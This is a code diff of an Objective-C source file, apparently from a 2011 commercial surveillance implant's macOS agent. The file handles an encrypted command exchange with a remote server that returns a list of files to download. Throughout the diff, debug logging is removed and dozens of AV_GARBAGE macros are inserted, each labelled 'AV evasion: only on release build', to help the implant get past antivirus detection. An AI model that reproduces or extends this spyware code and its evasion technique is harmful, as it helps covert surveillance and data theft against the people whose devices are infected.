@@ -6,10 +6,10 @@
  * Copyright (C) HT srl 2011. All rights reserved
  *
  */
+#import "RCSMCommon.h"
 
 #import "DownloadNetworkOperation.h"
 
-#import "RCSMCommon.h"
 #import "NSString+SHA1.h"
 #import "NSData+SHA1.h"
 #import "NSMutableData+AES128.h"
@@ -20,6 +20,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 @implementation DownloadNetworkOperation
 
@@ -32,9 +33,9 @@
       mTransport = aTransport;
       mDownloads = [[NSMutableArray alloc] init];
       
-#ifdef DEBUG_DOWN_NOP
-      infoLog(@"mTransport: %@", mTransport);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       return self;
     }
   
@@ -49,24 +50,33 @@
 
 - (BOOL)perform
 {
-#ifdef DEBUG_DOWN_NOP
-  infoLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   int32_t i = 0;
   uint32_t command = PROTO_DOWNLOAD;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                              length: sizeof(uint32_t)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSData *commandSha = [commandData sha1Hash];
   [commandData appendData: commandSha];
   
-#ifdef DEBUG_DOWN_NOP
-  infoLog(@"commandData: %@", commandData);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [commandData encryptWithKey: gSessionKey];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   //
   // Send encrypted message
@@ -75,32 +85,49 @@
   NSData *replyData             = nil;
   NSMutableData *replyDecrypted = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   replyData = [mTransport sendData: commandData
                  returningResponse: urlResponse];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (replyData == nil)
     {
-#ifdef DEBUG_DOWN_NOP
-      errorLog(@"empty reply from server");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       [commandData release];
       [outerPool release];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       return NO;
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
   [replyDecrypted decryptWithKey: gSessionKey];
   
-#ifdef DEBUG_DOWN_NOP
-  infoLog(@"replyDecrypted: %@", replyDecrypted);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003  
   
   [replyDecrypted getBytes: &command
                     length: sizeof(uint32_t)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   // remove padding
   [replyDecrypted removePadding];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   //
   // check integrity
@@ -109,58 +136,82 @@
   NSData *shaLocal;
   @try
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       shaRemote = [replyDecrypted subdataWithRange:
                    NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                                CC_SHA1_DIGEST_LENGTH)];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       shaLocal = [replyDecrypted subdataWithRange:
                   NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_DOWN_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_003    
       
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       return NO;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   shaLocal = [shaLocal sha1Hash];
   
-#ifdef DEBUG_DOWN_NOP
-  infoLog(@"shaRemote: %@", shaRemote);
-  infoLog(@"shaLocal : %@", shaLocal);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
-#ifdef DEBUG_DOWN_NOP
-      errorLog(@"sha mismatch");
-#endif
-      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   if (command != PROTO_OK)
     {
-#ifdef DEBUG_DOWN_NOP
-      errorLog(@"No download request available (command %d)", command);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       return NO;
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   uint32_t numOfStrings = 0;
   @try
     {
@@ -169,53 +220,72 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_AUTH_NOP
-      errorLog(@"exception on numOfStrings makerange (%@)", [e reason]);
-#endif
-      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       return NO;
     }
   
-#ifdef DEBUG_DOWN_NOP
-  infoLog(@"downloads available: %d", numOfStrings);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   
   if (numOfStrings == 0)
     {
-#ifdef DEBUG_DOWN_NOP
-      errorLog(@"numOfStrings is zero!");
-#endif
-      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       return NO;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   uint32_t stringDataSize = 0;
   NSMutableData *strings;
   @try
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [replyDecrypted getBytes: &stringDataSize
                          range: NSMakeRange(4, sizeof(uint32_t))];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       strings = [NSMutableData dataWithData:
                  [replyDecrypted subdataWithRange: NSMakeRange(12, stringDataSize)]];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_DOWN_NOP
-      errorLog(@"exception on stringDataSize makerange (%@)", [e reason]);
-#endif
-      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       return NO;
     }
   
   uint32_t len = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   //
   // Unpascalize n NULL terminated UTF16LE strings
@@ -224,6 +294,9 @@
   
   for (i = 0; i < numOfStrings; i++)
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       [strings getBytes: &len length: sizeof(uint32_t)];
       @try
         {
@@ -231,50 +304,69 @@
         }
       @catch (NSException *e)
         {
-#ifdef DEBUG_DOWN_NOP
-          errorLog(@"exception on stringData makerange (%@)", [e reason]);
-#endif
+          // AV evasion: only on release build
+          AV_GARBAGE_003        
           
           [replyDecrypted release];
           [commandData release];
           [outerPool release];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
           return NO;
         }
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
       
       NSString *string = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       if (string == nil)
         {
-#ifdef DEBUG_DOWN_NOP
-          errorLog(@"string is empty, error on unpascalize");
-#endif
-          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+        
           [replyDecrypted release];
           [commandData release];
           [outerPool release];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           return NO;
         }
       
-#ifdef DEBUG_DOWN_NOP
-      infoLog(@"string: %@", string);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_007      
       
       [mDownloads addObject: string];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       @try
         {
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           [strings replaceBytesInRange: NSMakeRange(0, len + 4)
                              withBytes: NULL
                                 length: 0];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
         }
       @catch (NSException *e)
         {
-#ifdef DEBUG_DOWN_NOP
-          errorLog(@"exception on replaceBytes makerange (%@)", [e reason]);
-#endif
-          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+        
           [replyDecrypted release];
           [commandData release];
           [outerPool release];
@@ -283,9 +375,15 @@
         }
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [replyDecrypted release];
   [commandData release];
   [outerPool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   return YES;
 }
